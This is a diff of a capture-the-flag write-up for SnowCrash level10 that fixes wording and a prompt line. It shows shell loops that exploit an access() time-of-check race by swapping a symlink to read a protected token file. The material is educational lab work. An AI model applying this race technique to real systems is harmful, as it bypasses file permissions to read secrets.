@@ -13,10 +13,10 @@ Warning: Using access() to check if a user is authorized to, for example, open a
 
 Then I could learn that the program connects to port `6969`.
 
-To get the flag I have to open the token through a symbolic link created with another file on my HOME. So I automate the process of creating the symbolic link and calling `./level10` with while in my shell:
+To get the flag I have to open the token through a symbolic link created with another file in my HOME. So I automate the process of creating the symbolic link and calling `./level10` with `while` in my shell:
 ```
 level10@SnowCrash:~$ chmod 777 . && touch test
-(while true; do ln -sf test tmp; ln -sf token tmp; done)&
+level10@SnowCrash:~$(while true; do ln -sf test tmp; ln -sf token tmp; done)&
 level10@SnowCrash:~$ while true; do ./level10 tmp 127.0.0.1; done
 Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
 You don't have access to tmp
